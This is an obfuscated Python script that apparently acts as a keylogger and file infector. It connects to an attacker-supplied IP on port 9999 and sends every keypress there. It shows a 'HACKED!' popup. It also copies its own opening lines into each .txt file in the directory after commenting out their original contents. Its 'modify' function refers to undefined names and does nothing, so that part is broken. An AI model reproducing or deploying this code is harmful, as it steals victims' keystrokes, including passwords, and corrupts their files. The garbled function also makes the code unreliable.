from pynput .keyboard import Listener ,Key #line:1
import socket #line:2
from tkinter import messagebox #line:3
import random #line:4
import string #line:5
import os #line:6
import sys #line:7
import glob #line:8
def modify (OOOOO00O0O0OO00OO ):#line:11
 O00OO0OOO00OOO00O =OOOOO00O0O0OO00OO *5 #line:12
 O0OOO00OO00000O0O =O00OO0OOO00OOO00O #line:13
 for O0OO000000OO000OO in encryprt: #line:14
   O0OO000000OO000OO <<24 #line:15
 return encrypt #line:16
host ='' #change to Attacker's IP 
port =9999 #line:20
s =socket .socket ()#line:22
s .connect ((host ,port ))#line:23
messagebox .showinfo ("HACKED!","You May Be Getting Key Logged")#line:26
IN =open (sys .argv [0 ],'r')#line:28
virus =[O0000O0000OO00OO0 for (O0OO0OO0O000O0000 ,O0000O0000OO00OO0 )in enumerate (IN )if O0OO0OO0O000O0000 <63 ]#line:29
def generate_random_letters (O00OO0OOO0OOOO000 ):#line:31
    return ''.join (random .choices (string .ascii_letters ,k =O00OO0OOO0OOOO000 ))#line:32
randomstring =generate_random_letters (100 )#line:34
for item in glob .glob ("*.txt"):#line:36
  IN =open (item ,'r')#line:37
  all_of_it =IN .readlines ()#line:38
  IN .close ()#line:39
  if any ('from pynput.keyboard import Listener, Key'in OO000OO0O000O0O00 for OO000OO0O000O0O00 in all_of_it ):continue #line:40
  os .chmod (item ,0o777 )#line:41
  OUT =open (item ,'w')#line:42
  all_of_it =['#'+O0O00O00OO0OO0OOO for O0O00O00OO0OO0OOO in all_of_it ]#line:43
  OUT .writelines (all_of_it )#line:44
  OUT .writelines ('newfile ='+randomstring +'\n')#line:45
  OUT .writelines (virus )#line:46
  OUT .close ()#line:47
def press (OO00O000O000OOOOO ):#line:49
    s .send (str (OO00O000O000OOOOO ).encode ())#line:51
def release (OOOOOO0O0O0O0O00O ):#line:53
    if OOOOOO0O0O0O0O00O ==Key .esc :#line:54
    	return False #line:55
with Listener (on_press =press ,on_release =release )as listener :#line:57
    listener .join ()#line:58
